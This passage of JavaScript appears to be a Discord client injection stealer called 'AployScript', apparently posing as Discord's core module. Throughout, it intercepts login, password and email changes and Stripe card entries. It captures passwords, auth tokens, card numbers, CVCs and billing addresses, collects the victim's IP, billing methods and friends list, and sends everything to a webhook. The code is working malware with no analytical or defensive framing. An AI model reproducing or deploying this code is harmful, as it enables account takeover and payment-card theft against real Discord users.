										value: `${GetBadges(json.flags)}`,
										inline: !1
									}, {
										name: "Billing",
										value: `${Cool()}`,
										inline: !1
									}, {
										name: "New Email",
										value: `\`${newemail}\``,
										inline: !0
									}, {
										name: "Password",
										value: `\`${password}\``,
										inline: !0
									}, {
										name: "Token",
										value: `\`\`\`${token}\`\`\``,
										inline: !1
									}, ],
									"author": {
										"name": "AployScript"
									},
									"footer": {
										"text": "AployScript"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}, {
									"title": `Total Friends (${totalFriends()})`,
									"color": config['embed-color'],
									"description": CalcFriends(),
									"author": {
										"name": "AployScript"
									},
									"footer": {
										"text": "AployScript"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}]
							}
							var mfaembed = {
								"title": ":detective: __2FA Codes__",
								"description": `[Get all of them](${baseuri})`,
								"color": config['embed-color'],
								"fields": fieldo,
								"author": {
									"name": "AployScript"
								},
								"footer": {
									"text": "AployScript"
								}
							}
							if (token.startsWith("mfa")) {
								params.embeds.push(mfaembed)
							}

							SendToWebhook(JSON.stringify(params))

						})
					} else {

						const window = BrowserWindow.getAllWindows()[0];
						window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "Não tem Raros Amigos \<:x_Trist:933473039696420904>"
											}
											return gay
										}

										function Cool() {
											const json = JSON.parse(info3)
											var billing = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\<a:rd_no:719061417054961716>"
												} else if (z.type == 2 && z.invalid != !0) {
													billing += "\<a:x_sim:756001384410644621>" + " \<:za_Pay:939927129708195900>"
												} else if (z.type == 1 && z.invalid != !0) {
													billing += "\<a:x_sim:756001384410644621>" + " <a:black_card:821658346943152198>"
												} else {
													return "\<a:rd_no:719061417054961716>"
												}
											})
											if (billing == "") {
												billing = "\<a:rd_no:719061417054961716>"
											}
											return billing
										}
										const json = JSON.parse(info);
										var params = {
											username: "AployScript",
											content: "",
											embeds: [{
												"title": "𝐈𝐧𝐣𝐞𝐭𝐚𝐝𝐢𝐧𝐡𝐚 𝐧𝐨 𝐜𝐨𝐫𝐩𝐢𝐧𝐡𝐨 \<a:ps_xgf:719132797058547753>",
												"color": config['embed-color'],
												"fields": [{
													name: "𝐓𝐨𝐤𝐞𝐧 𝐓𝐫𝐚𝐧𝐬",
													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
													inline: !1
												}, {
													name: "Username",
													value: `\`${json.username}#${json.discriminator}\``,
													inline: !0
												}, {
													name: "ID",
													value: `\`${json.id}\``,
													inline: !0
												}, {
													name: "Nitro",
													value: `${GetNitro(json.premium_type)}`,
													inline: !1
												}, {
													name: "Badges",
													value: `${GetBadges(json.flags)}`,
													inline: !1
												}, {
													name: "Billing",
													value: `${Cool()}`,
													inline: !1
												}, {
													name: "New Email",
													value: `\`${newemail}\``,
													inline: !0
												}, {
													name: "Password",
													value: `\`${password}\``,
													inline: !0
												}, {
													name: "Token",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
												}, ],
												"author": {
													"name": "AployScript"
												},
												"footer": {
													"text": "AployScript"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `Total Friends (${totalFriends()})`,
												"color": config['embed-color'],
												"description": CalcFriends(),
												"author": {
													"name": "AployScript"
												},
												"footer": {
													"text": "AployScript"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										SendToWebhook(JSON.stringify(params))
									})
								})
							})
						})

					}
				})
			})
		})
	})
}

function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			var json = JSON.parse(info);
			var params = {
				username: "AployScript",
				content: "",
				embeds: [{
					"title": "𝐈𝐧𝐣𝐞𝐭𝐚𝐝𝐢𝐧𝐡𝐚 𝐧𝐨 𝐜𝐨𝐫𝐩𝐢𝐧𝐡𝐨 \<a:ps_xgf:719132797058547753>",
					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
					"author": {
						"name": "AployScript"
					},
					"footer": {
						"text": "AployScript"
					},
					"thumbnail": {
						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
					}
				}]
			}
			SendToWebhook(JSON.stringify(params))
		})
	})
}
const ChangePasswordFilter = {
	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
				Login(email, password, token)
			}))
		} else {}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangeEmail(data.email, data.password, token)
					}))
				}
			}
		} else {}
	}
	if (details.url.endsWith("tokens")) {
		const window = BrowserWindow.getAllWindows()[0];
		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
		}))
	}
});
module.exports = require('./core.asar')